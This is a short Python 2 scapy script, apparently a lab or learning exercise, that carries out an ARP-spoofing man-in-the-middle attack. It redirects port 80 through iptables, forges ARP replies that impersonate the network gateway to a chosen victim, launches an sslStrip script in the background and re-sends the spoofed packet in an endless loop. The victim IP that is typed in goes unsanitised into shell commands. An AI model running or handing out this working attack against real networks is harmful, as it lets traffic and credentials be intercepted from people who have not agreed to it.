from scapy.all import *
import os
import subprocess
import time

os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 20000")

vIP = raw_input("Victim IP address?")

file= open("vIP.txt", "w+")
file.write(vIP)
#time.sleep(1)
print(file.read())
file.close
#time.sleep(1)

os.system("ping -c 1 " + vIP)
#os.system("arp -n " + vIP)

vMAC = subprocess.check_output("arp -a " + vIP + " | awk '{print $4}' ", shell = True)
gatewayIP = subprocess.check_output("route -n | awk '$1 == \"0.0.0.0\" {print $2}' ", shell = True)

print gatewayIP

macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)

print macAttacker

arp = Ether() / ARP()
arp[Ether].src = macAttacker
arp[ARP].hwsrc = macAttacker
arp[ARP].psrc = gatewayIP
arp[ARP].hwdst = vMAC
arp[ARP].pdst = vIP

def sendARP():
    sendp(arp, iface="enp0s3")
    time.sleep(1)

os.system("python sslStrip.py & disown")

while True:
    sendARP()
